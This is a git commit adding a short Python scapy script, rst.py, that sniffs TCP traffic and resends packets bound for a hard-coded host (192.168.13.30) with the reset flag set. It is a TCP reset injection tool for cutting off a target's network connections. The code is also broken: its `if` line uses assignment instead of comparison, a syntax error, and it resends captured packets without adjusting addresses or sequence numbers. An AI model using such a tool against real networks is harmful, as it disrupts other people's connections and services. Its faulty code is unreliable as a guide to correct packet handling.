839bbb5d2c443fe3829ce838276a49acc76d9e31
Samuel Wehunt <sam.wehunt@gmail.com>
2017-10-14 21:01:21 -0500

    added reset function

---
+++ rst.py
@@ -0,0 +1,14 @@
+from scapy.all import *
+
+target_ip = "192.168.13.30"
+
+def pkt_callback(packet):
+    if (TCP in packet):
+        if (packet[IP].dst = target_ip):
+            resetPkt = packet
+            resetPkt[TCP].flags = 'R'
+            sendp(resetPkt)
+
+
+interface = "ens10"
+sniff(iface=interface, prn=pkt_callback, filter="tcp", store=0)
